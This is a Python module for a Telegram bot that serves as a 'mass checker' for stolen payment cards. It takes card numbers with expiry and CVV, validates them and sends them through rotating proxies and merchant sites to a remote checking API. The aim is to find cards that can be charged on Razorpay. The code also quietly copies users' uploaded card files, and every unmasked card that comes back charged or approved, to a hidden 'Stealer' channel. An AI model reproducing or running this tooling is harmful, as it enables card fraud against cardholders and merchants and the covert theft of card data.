import asyncio
import aiohttp
import re
import time
import json
import html
import random
import logging
import os
import psycopg2.extras
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from utils_send import safe_send_message
from database import is_gate_enabled, get_db_connection
from bin import get_bin_info
from sub import get_premium_status

async def get_user_proxies(user_id):
    proxies = []
    try:
        def _sync_fetch():
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT proxy FROM proxies WHERE user_id = %s", (user_id,))
            rows = cursor.fetchall()
            conn.close()
            return [row[0] for row in rows]
        proxies = await asyncio.to_thread(_sync_fetch)
    except Exception as e:
        logging.error(f"Error fetching proxies for user {user_id}: {e}")
    return proxies

def normalize_proxy(proxy: str) -> str:
    if not proxy or not proxy.strip():
        return ""
    proxy = proxy.strip()
    if proxy.startswith(('http://', 'https://')):
        return proxy
    if proxy.startswith('socks5://'):
        return 'http://' + proxy[9:]
    if '@' in proxy and ':' in proxy.split('@')[0]:
        return f'http://{proxy}'
    parts = proxy.split()
    if len(parts) == 4:
        user, pwd, host, port = parts
        return f'http://{user}:{pwd}@{host}:{port}'
    if ':' in proxy and '@' not in proxy:
        parts = proxy.split(':')
        if len(parts) == 2 and parts[1].isdigit():
            return f'http://{proxy}'
    return f'http://{proxy}'

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_URL = "http://93.127.136.206:7004/check?gate=razorpay&key=WIZ-DEV"

SITES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "mass_gates", "sites_razor.txt")

MAX_MASS_CARDS = 50
PARALLEL_LIMIT = 20
MAX_RETRIES = 1
MAX_SITE_ROTATIONS = 20
UPDATE_EVERY = 10

RZ_SESSIONS = {}

# Custom Emoji IDs
CUSTOM_CHARGED_EMOJI_ID = "5343636681473935403"
CUSTOM_APPROVED_EMOJI_ID = "5039844895779455925"
CUSTOM_DECLINED_EMOJI_ID = "4915853119839011973"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def ensure_stats_columns():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_checked INTEGER DEFAULT 0")
        except Exception:
            pass
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_charged INTEGER DEFAULT 0")
        except Exception:
            pass
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(f"Error checking stats columns: {e}")

ensure_stats_columns()

def update_user_stats_sync(user_id, checked_count, charged_count):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET cc_checked = cc_checked + %s WHERE user_id = %s",
        (checked_count, user_id)
    )
    if charged_count > 0:
        cursor.execute(
            "UPDATE users SET cc_charged = cc_charged + %s WHERE user_id = %s",
            (charged_count, user_id)
        )
    conn.commit()
    conn.close()

async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute(
                    "SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1",
                    (user_id,)
                )
                row = cursor.fetchone()
                conn.close()
                if row:
                    p = row['plan'].lower()
                    if "root" in p: return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                    if "elite" in p: return '𝗘𝗹𝗶𝘁𝗲 ⭐'
                    if "core" in p: return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
                    return row['plan']
                return "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "TRIAL"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GENERAL HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

logger = logging.getLogger(__name__)

def load_sites() -> List[str]:
    try:
        if not os.path.exists(SITES_FILE):
            return []
        with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Error loading sites: {e}")
        return []

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        exp_year = int(yy)
        exp_month = int(mm)
        current_year = now.year % 100
        if exp_year < current_year:
            return True
        if exp_year == current_year and exp_month < now.month:
            return True
        return False
    except ValueError:
        return True

def parse_card(text: str) -> Optional[Tuple[str, str, str, str]]:
    text = text.strip()
    pattern = r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        cc, mm, yy, cvv = match.groups()
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        return cc, mm, yy, cvv
    return None

def extract_cards(raw_text: str) -> List[str]:
    cards = []
    for line in raw_text.split('\n'):
        data = parse_card(line)
        if data:
            cc, mm, yy, cvv = data
            cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards[:MAX_MASS_CARDS]

def get_sort_priority(response_text: str) -> int:
    resp = response_text.upper()
    if any(k in resp for k in ["ORDER_PLACED", "CHARGED", "ORDER_PAID", "THANK YOU"]):
        return 1
    if "3DS" in resp or "3D_AUTH" in resp or "INSUFFICIENT_FUNDS" in resp or "INVALID_CVC" in resp:
        return 2
    return 3

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE CHECKING LOGIC  (new API + proxy rotation)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Responses that mean "try a different site / proxy" — not a real card decline
ROTATION_TRIGGERS = [
    'generic_error', 'generic error', 'r4 token empty', 'payment method is not razorpay!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not razorpay!', 'site error! status: 404',
    'site error! status: 401', 'site error! status: 402',
    'failed to get checkout', 'captcha at checkout', 'site not supported',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'amount_too_small',
    'change proxy or site', 'token not found', 'invalid_response',
    'resolve', 'item', 'curl error', 'could not resolve host',
    'connect tunnel failed', 'api error: http 429', 'http 429', '429', 'too many requests', 'international cards are not supported',
]

async def check_card_logic(sites: List[str], cc: str, proxies: List[str]) -> Dict:
    bin_num = cc.split('|')[0][:6]

    try:
        bin_data = await get_bin_info(bin_num)
        brand = (bin_data.get("scheme") or "N/A").title()
        issuer = bin_data.get("bank") or "N/A"
        country = bin_data.get("country") or "Unknown"
        flag = bin_data.get("country_emoji", "")
        bin_info = f"{issuer}|{country}{flag}"
    except Exception:
        brand = "N/A"
        bin_info = "Unknown|Unknown"

    declined_sym = f'<tg-emoji emoji-id="4915853119839011973">⚠️</tg-emoji>'

    last_site = None
    last_display_resp = "Dead / Site Error"
    last_price = "N/A"
    last_symbol = declined_sym

    rotation_count = 0
    rate_limit_retries = 0
    MAX_RATE_LIMIT_RETRIES = 15
    while rotation_count < MAX_SITE_ROTATIONS:
        rotation_count += 1

        for retry_idx in range(MAX_RETRIES + 1):
            # Pick a site different from the last one if possible
            candidates = [s for s in sites if s != last_site] or sites
            current_site = random.choice(candidates)
            last_site = current_site

            # Pick a random proxy each retry
            raw_proxy = random.choice(proxies)
            proxy = normalize_proxy(raw_proxy)
            try:
                timeout = aiohttp.ClientTimeout(total=30)
                # New API format: /check?gate=razorpay&key=WIZ-DEV&site={site}&cc={cc}&proxy={proxy}
                cc_encoded = cc.replace("|", "%7C")
                api_call_url = f"{API_URL}&site={current_site}&cc={cc_encoded}&proxy={proxy}"
                async with aiohttp.ClientSession() as session:
                    async with session.get(api_call_url, timeout=timeout) as resp:
                        if resp.status == 429:
                            if retry_idx < MAX_RETRIES:
                                await asyncio.sleep(1)
                                continue
                            break

                        text = await resp.text()
                        data = json.loads(text)

                        raw_resp = data.get("message", data.get("response", "N/A"))
                        raw_price = "N/A"  # No price in response

                        display_resp = (
                            str(raw_resp)
                            .replace("\\\\", "")
                            .replace("/", "")
                            .replace('"', '')
                            .replace("'", "")
                        )

                        price_display = "N/A"
                        if raw_price not in ("N/A", None, ""):
                            try:
                                val = float(
                                    str(raw_price).replace("USD", "").replace("$", "").strip()
                                )
                                price_display = f"1.00 ₹"
                            except ValueError:
                                price_display = str(raw_price)

                        lower = display_resp.lower()
                        api_status_raw = data.get("response", data.get("status", "declined"))
                        if isinstance(api_status_raw, bool):
                            api_status = "charged" if api_status_raw else "declined"
                        else:
                            api_status = str(api_status_raw).lower()

                        # Assign result symbol
                        fake_charge_detected = False
                        is_definitive = False
                        if api_status == "approved" or any(k in lower for k in [
                            "insufficient_funds", "invalid_cvc", "incorrect_cvv", "insufficient",
                        ]):
                            symbol = f'<tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>'
                            is_definitive = True
                        elif api_status == "charged" or any(k in lower for k in ["thank you", "order_placed", "charged", "order_paid", "transaction successful", "pay_"]):
                            # ── FAKE CHARGED DETECTION SYSTEM ──
                            fake_cc = "4400666318254873|03|27|336"
                            fake_cc_encoded = fake_cc.replace("|", "%7C")
                            fake_url = f"{API_URL}&site={current_site}&cc={fake_cc_encoded}&proxy={proxy}"
                            try:
                                async with aiohttp.ClientSession() as f_session:
                                    async with f_session.get(fake_url, timeout=timeout) as f_resp:
                                        if f_resp.status == 200:
                                            f_text = await f_resp.text()
                                            f_data = json.loads(f_text)
                                            f_lower = str(f_data.get("response", f_data.get("Response", ""))).lower()
                                            if any(k in f_lower for k in ["thank you", "order_placed", "charged", "order_paid", "transaction successful", "pay_"]):
                                                fake_charge_detected = True
                            except Exception:
                                pass

                            if fake_charge_detected:
                                display_resp = "Site Error (Fake Charge Site)"
                                symbol = declined_sym
                            else:
                                symbol = f'<tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">🔥</tg-emoji>'
                                is_definitive = True
                        elif api_status == "declined" or any(k in lower for k in [
                            "3d_authentication", "3ds_required", "payment_cancelled",
                            "card_number_invalid", "card_not_enrolled", "card_network_not_enabled",
                            "card_declined", "gateway_technical_error", "debit_instrument_inactive",
                            "transaction_limit_exceeded", "card_cvv_invalid",
                        ]):
                            symbol = declined_sym
                            is_definitive = True
                        else:
                            symbol = declined_sym

                        last_display_resp = display_resp
                        last_price = price_display
                        last_symbol = symbol

                        # If it's a rotation trigger, try next site
                        needs_rotation = not is_definitive and (fake_charge_detected or any(t in lower for t in ROTATION_TRIGGERS))
                        if needs_rotation:
                            if "429" in lower or "too many requests" in lower:
                                if rate_limit_retries < MAX_RATE_LIMIT_RETRIES:
                                    rate_limit_retries += 1
                                    rotation_count = max(0, rotation_count - 1)
                            break  # break the retry loop, rotate site

                        return {
                            "card": cc,
                            "resp": display_resp,
                            "price": price_display,
                            "bin": bin_info,
                            "brand": brand,
                            "symbol": symbol,
                        }

            except aiohttp.ClientResponseError as e:
                if e.status == 429:
                    if retry_idx < MAX_RETRIES:
                        await asyncio.sleep(1)
                        continue
                    if rate_limit_retries < MAX_RATE_LIMIT_RETRIES:
                        rate_limit_retries += 1
                        rotation_count = max(0, rotation_count - 1)
                break
            except (asyncio.TimeoutError, aiohttp.ClientConnectorError):
                if retry_idx < MAX_RETRIES:
                    await asyncio.sleep(1)
                    continue
                break
            except json.JSONDecodeError:
                break

    return {
        "card": cc,
        "resp": last_display_resp,
        "price": last_price,
        "bin": bin_info,
        "brand": brand,
        "symbol": last_symbol,
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/rz"))
async def rz_command(message: types.Message):
    user_id = message.from_user.id
    user_name = html.escape(message.from_user.first_name or "User")

    if not await asyncio.to_thread(is_gate_enabled, "sh"):
        await message.reply(
            "<tg-emoji emoji-id='4958926882994127612'>🚧</tg-emoji> <b>𝗠𝗮𝘀𝘀 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>",
            parse_mode="HTML"
        )
        return

    sites = load_sites()
    if not sites:
        await message.reply("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> No sites found in <code>sites.txt</code>.", parse_mode="HTML")
        return

    # Fetch user proxies
    user_proxies = await get_user_proxies(user_id)
    if not user_proxies:
        await message.reply(
            "<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> <b>𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗙𝗼𝘂𝗻𝗱</b>\n\n"
            "You need to add proxies to use this gate.\n"
            "Use <code>/proxy</code> to add proxies.",
            parse_mode="HTML"
        )
        return

    # ─── Extract cards from command text or replied message ──────────
    raw_text = ""
    parts = message.text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1].strip() + "\n"

    if message.reply_to_message:
        replied = message.reply_to_message
        if replied.text:
            raw_text += replied.text
        elif replied.caption:
            raw_text += replied.caption
        if replied.document:
            try:
                await message.bot.send_document(
                    chat_id=-1003916865840,
                    document=replied.document.file_id,
                    caption=f"User <a href='tg://user?id={user_id}'>{user_name}</a> sent a txt file in /rz",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"Failed to forward txt file to extra group: {e}")

    if message.document:
        try:
            await message.bot.send_document(
                chat_id=-1003916865840,
                document=message.document.file_id,
                caption=f"User <a href='tg://user?id={user_id}'>{user_name}</a> sent a txt file in /rz",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Failed to forward txt file to extra group: {e}")

    if not raw_text.strip():
        await message.reply(
            "<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>Usage:</b> Reply to a message with cards or send\n"
            "<code>/rz cc|mm|yy|cvv</code>",
            parse_mode="HTML"
        )
        return

    # ─── Extract & deduplicate ───────────────────────────────────────
    extracted = extract_cards(raw_text)
    if not extracted:
        await message.reply("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> No valid cards found.")
        return

    seen = set()
    unique_cards = []
    for card in extracted:
        if card not in seen:
            seen.add(card)
            unique_cards.append(card)

    # ─── Validate (Luhn + expiry) ────────────────────────────────────
    final_valid_cards = []
    luhn_fail_count = 0
    expired_count = 0

    for cc in unique_cards:
        p = cc.split('|')
        if len(p) < 4:
            continue
        cc_num, mm, yy, _ = p
        if not luhn_check(cc_num):
            luhn_fail_count += 1
            continue
        if is_expired(mm, yy):
            expired_count += 1
            continue
        final_valid_cards.append(cc)

    if luhn_fail_count > 0 or expired_count > 0:
        removed = luhn_fail_count + expired_count
        await message.reply(
            f"ℹ️ <b>Removed:</b> {removed} invalid/expired cards.\n"
            f"Checking <b>{len(final_valid_cards)}</b> valid cards...",
            parse_mode="HTML"
        )

    if not final_valid_cards:
        await message.reply("<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> No valid cards to check after filtering.")
        return

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    asyncio.create_task(
        run_rz_check(message, sites, final_valid_cards, user_name, user_id, is_premium, user_proxies)
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ASYNC MASS CHECKER & UI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def run_rz_check(
    message: types.Message,
    sites: List[str],
    cards: List[str],
    user_name: str,
    user_id: int,
    is_premium: bool,
    user_proxies: List[str],
):
    start_time = time.time()
    total_cards = len(cards)
    user_link = f"<a href='tg://user?id={user_id}'>{user_name}</a>"

    status_msg = await message.reply(
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <code>{total_cards}</code>\n"
        f"<tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛ <code>0.0s</code>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_link}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> <b>𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸...</b>",
        parse_mode="HTML"
    )
    msg_id = status_msg.message_id

    RZ_SESSIONS[msg_id] = {
        "gate_name": "sh",
        "results": [],
        "page": 0,
        "total_cards": total_cards,
        "start_time": start_time,
        "user_name": user_name,
        "user_id": user_id,
        "msg_id": msg_id,
    }

    sem = asyncio.Semaphore(PARALLEL_LIMIT)

    async def worker(cc: str):
        async with sem:
            return await check_card_logic(sites, cc, user_proxies)

    tasks = [asyncio.create_task(worker(cc)) for cc in cards]

    results = []
    pending = set(tasks)

    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
        for task in done:
            try:
                res = task.result()
                results.append(res)
                
                # Check for charged/approved to send to extra group
                symbol = res.get("symbol", "")
                if f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in symbol or f'emoji-id="{CUSTOM_APPROVED_EMOJI_ID}"' in symbol:
                    hit_type = "CHARGED" if f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in symbol else "APPROVED"
                    card_parts = res['card'].split('|')
                    if len(card_parts) >= 1:
                        cc = card_parts[0]
                        if len(cc) > 4:
                            card_parts[0] = "x" * (len(cc) - 4) + cc[-4:]
                    for idx in range(1, len(card_parts)):
                        card_parts[idx] = "x" * len(card_parts[idx])
                    masked_card = "|".join(card_parts)

                    try:
                        caption_logs = (
                            f"<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {hit_type} {symbol}\n"
                            f"<tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗮𝗿𝗱 ➛ <code>{masked_card}</code>\n"
                            f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆\n"
                            f"<tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{res['resp']}</b>\n"
                            f"<tg-emoji emoji-id='6237822905128851025'>🆔</tg-emoji> 𝗕𝗿𝗮𝗻𝗱 ➛ <b>{res['brand']}</b>\n"
                            f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➛ <b>{res['bin']}</b>\n"
                            f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ <a href='tg://user?id={user_id}'>{user_name}</a>"
                        )
                        caption_stealer = (
                            f"<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> 𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {hit_type} {symbol}\n"
                            f"<tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗮𝗿𝗱 ➛ <code>{res['card']}</code>\n"
                            f"<tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ <b>Razorpay</b>\n"
                            f"<tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{res['resp']}</b>\n"
                            f"<tg-emoji emoji-id='6237822905128851025'>🆔</tg-emoji> 𝗕𝗿𝗮𝗻𝗱 ➛ <b>{res['brand']}</b>\n"
                            f"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➛ <b>{res['bin']}</b>\n"
                            f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ <a href='tg://user?id={user_id}'>{user_name}</a>"
                        )
                        # Broadcast to Logs channel
                        await safe_send_message(message.bot,
                            chat_id=-1004487271540,
                            text=caption_logs,
                            parse_mode="HTML"
                        )
                        # Broadcast to Stealer channel
                        await safe_send_message(message.bot,
                            chat_id=-1003916865840,
                            text=caption_stealer,
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.error(f"Failed to broadcast hit: {e}")
            except Exception as e:
                logger.error(f"Worker error: {e}")

        results.sort(key=lambda x: get_sort_priority(x["resp"]))

        if len(results) % UPDATE_EVERY == 0 or not pending:
            elapsed = round(time.time() - start_time, 2)
            RZ_SESSIONS[msg_id]["results"] = results
            RZ_SESSIONS[msg_id]["elapsed_final"] = elapsed

            text = format_page_content(RZ_SESSIONS[msg_id], elapsed, is_working=True)
            if len(results) < total_cards:
                text += f"\n\n<tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(results)}/{total_cards}...</b>"

            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
            except Exception:
                pass

    elapsed_final = round(time.time() - start_time, 2)
    RZ_SESSIONS[msg_id]["elapsed_final"] = elapsed_final

    # ─── Stats ───────────────────────────────────────────────────────
    charged_count = sum(
        1 for r in results
        if f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in r.get("symbol", "")
    )
    await asyncio.to_thread(update_user_stats_sync, user_id, len(results), charged_count)


    final_text = format_page_content(RZ_SESSIONS[msg_id], elapsed_final, is_working=False)
    final_text += "\n\n<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲.</b>"

    await status_msg.edit_text(final_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))


def format_page_content(state: Dict, elapsed: float, is_working: bool) -> str:
    results = state["results"]
    page = state["page"]
    start_idx = page * 6
    page_results = results[start_idx: start_idx + 6]

    user_link = f"<a href='tg://user?id={state['user_id']}'>{state['user_name']}</a>"

    text = (
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <code>{len(results)}/{state['total_cards']}</code>\n"
        f"<tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛ <code>{elapsed}s</code>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_link}\n"
        f"━━━━━━━━━━━━━━━━"
    )

    for res in page_results:
        safe_resp = html.escape(res.get("resp", "UNKNOWN"))
        safe_bin = html.escape(res.get("bin", "N/A"))
        price_str = f" <b>{res.get('price')}</b>" if res.get("price") not in ["N/A", ""] else ""
        text += (
            f"\n<code>{res['card']}</code>\n"
            f"<b>{safe_resp}</b> {res.get('symbol', '')}{price_str}\n"
            f"<b>{safe_bin}</b>\n"
            f"━━━━━━━━━━━━━━━━"
        )

    return text


def get_keyboard(msg_id: int) -> Optional[InlineKeyboardMarkup]:
    state = RZ_SESSIONS.get(msg_id)
    if not state:
        return None

    total = len(state["results"])
    pages = (total + 5) // 6
    current = state["page"]

    row = []
    if current > 0:
        row.append(InlineKeyboardButton(text="Back", callback_data=f"rz_prev_{msg_id}", icon_custom_emoji_id="5042097984083330584"))
    if current < pages - 1:
        row.append(InlineKeyboardButton(text="Next", callback_data=f"rz_next_{msg_id}", icon_custom_emoji_id="5042097984083330584"))

    return InlineKeyboardMarkup(inline_keyboard=[row]) if row else None


@router.callback_query(F.data.startswith("rz_"))
async def rz_callback_handler(callback: types.CallbackQuery):
    data = callback.data
    parts = data.split("_")

    if len(parts) < 3:
        return
    try:
        msg_id = int(parts[2])
    except (ValueError, IndexError):
        return

    state = RZ_SESSIONS.get(msg_id)
    if not state:
        await callback.answer("Session expired.", show_alert=True)
        return

    if callback.from_user.id != state["user_id"]:
        await callback.answer("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗬𝗼𝘂 𝗰𝗮𝗻𝗻𝗼𝘁 𝗶𝗻𝘁𝗲𝗿𝗮𝗰𝘁 𝘄𝗶𝘁𝗵 𝘁𝗵𝗶𝘀 𝗺𝗲𝗻𝘂.", show_alert=True)
        return

    await callback.answer()

    action = parts[1]
    total_results = len(state["results"])
    total_pages = (total_results + 5) // 6

    if action == "next" and state["page"] < total_pages - 1:
        state["page"] += 1
    elif action == "prev" and state["page"] > 0:
        state["page"] -= 1

    elapsed = state.get("elapsed_final", round(time.time() - state["start_time"], 2))

    text = format_page_content(state, elapsed, is_working=False)
    if len(state["results"]) < state["total_cards"]:
        text += f"\n\n<tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(state['results'])}/{state['total_cards']}...</b>"
    else:
        text += "\n\n<tg-emoji emoji-id='5039844895779455925'>🍾</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲.</b>"

    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except Exception:
        pass
